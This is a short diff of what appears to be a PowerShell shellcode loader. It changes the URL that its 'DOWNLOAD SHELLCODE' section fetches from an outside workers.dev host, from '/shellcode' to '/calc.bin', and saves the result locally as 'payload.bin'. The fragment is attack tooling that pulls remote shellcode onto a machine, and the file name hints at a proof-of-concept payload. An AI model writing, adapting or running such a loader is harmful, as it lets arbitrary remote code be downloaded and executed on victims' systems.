@@ -66,7 +66,7 @@ try {
     }
     
     # === DOWNLOAD SHELLCODE ===
-    $shellcodeUrl = "https://aged-mountain-614b.natalia-kush82.workers.dev/shellcode"
+    $shellcodeUrl = "https://aged-mountain-614b.natalia-kush82.workers.dev/calc.bin"
     $shellcodePath = Join-Path $cachePath "payload.bin"
     
     Write-DebugLog "Downloading shellcode from: $shellcodeUrl"
